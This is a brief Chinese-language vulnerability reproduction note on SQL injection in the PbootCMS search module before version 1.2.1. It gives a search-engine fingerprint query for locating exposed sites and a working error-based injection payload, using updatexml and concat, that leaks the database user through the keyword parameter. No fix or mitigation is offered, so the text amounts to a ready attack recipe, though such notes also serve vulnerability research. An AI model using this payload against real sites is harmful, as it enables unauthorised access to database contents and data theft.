# PbootCMS search SQL注入漏洞

## 漏洞描述

PbootCMS 搜索模块存在SQL注入漏洞。通过漏洞可获取数据库敏感信息

## 漏洞影响

<a-checkbox checked>PbootCMS < 1.2.1</a-checkbox></br>

## 网络测绘 

<a-checkbox checked>app="PBOOTCMS"</a-checkbox></br>

## 漏洞复现

搜索框页面为

![img](../../../.vuepress/public/img/image-20210702112736099.png)



Payload为



```plain
/index.php/Search/index?keyword=123&updatexml(1,concat(0x7e,user(),0x7e),1));%23=123](http://127.0.0.1/PbootCMS/index.php/Search/index?keyword=123&updatexml(1,concat(0x7e,user(),0x7e),1));%23=123)
```



![img](../../../.vuepress/public/img/image-20210702112805069.png)



